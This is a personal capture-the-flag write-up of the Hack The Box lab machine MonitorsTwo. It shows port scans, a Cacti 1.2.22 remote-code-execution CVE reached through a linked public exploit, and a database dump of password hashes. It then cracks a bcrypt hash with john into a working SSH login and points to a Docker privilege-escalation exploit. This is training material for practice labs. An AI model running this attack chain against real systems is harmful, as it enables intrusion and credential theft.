Start with `rustscan`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/MonitorTwo]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.211:22
Open 10.10.11.211:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 12:47 EDT
Initiating Ping Scan at 12:47
Scanning 10.10.11.211 [2 ports]
Completed Ping Scan at 12:47, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:47
Completed Parallel DNS resolution of 1 host. at 12:47, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:47
Scanning 10.10.11.211 [2 ports]
Discovered open port 22/tcp on 10.10.11.211
Discovered open port 80/tcp on 10.10.11.211
Completed Connect Scan at 12:47, 0.06s elapsed (2 total ports)
Nmap scan report for 10.10.11.211
Host is up, received syn-ack (0.057s latency).
Scanned at 2023-07-04 12:47:15 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

Again with `nmap` for open port
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/MonitorTwo]
└─$

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/MonitorTwo]
└─$ nmap -sV -sC -p22,80 $IP -o nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 12:48 EDT
Nmap scan report for 10.10.11.211
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

Login to web (cacti): `Version 1.2.22 | (c) 2004-2023 - The Cacti Group`
Search for exploit: 
https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
We have rev shell:
![[Screenshot 2023-07-04 at 11.52.09 PM.png]]

But this shell only have root account. Seem like we are on container.
```sh
bash-5.1$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
bash-5.1$
```

Found `entrypoint.sh`
```sh
bash-5.1$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

There are db in `/var/www/html/cacti.sql`
show `user_auth` table
```sh
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
< --password=root cacti -e "select * from user_auth"
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	00
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1on	-1	-1		off	0	0	2135691668
bash-5.1$
```

There 2 password 
```
$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Crack password with `john`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/MonitorTwo]
└─$ john hash2 --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.03% (ETA: 2023-07-07 16:50) 0g/s 64.58p/s 64.58c/s 64.58C/s marias..clarisse
funkymonkey      (?)
1g 0:00:02:12 DONE (2023-07-04 13:28) 0.007556g/s 64.47p/s 64.47c/s 64.47C/s ilovegod1..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We have credential. Lets try to login with this cred.
```
marcus:funkymonkey
```
Well, we are in. Look like we got real machine.
```sh

marcus@monitorstwo:~$ ip a | grep inet
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
    inet 10.10.11.211/23 brd 10.10.11.255 scope global eth0
```

Privilege i alway start with `linpeas`. Nothing new.
Check `docker` version:
```sh
marcus@monitorstwo:~$ docker -v
Docker version 20.10.5+dfsg1, build 55c4c88
```
There is exploit with this version:
https://github.com/UncleJ4ck/CVE-2021-41091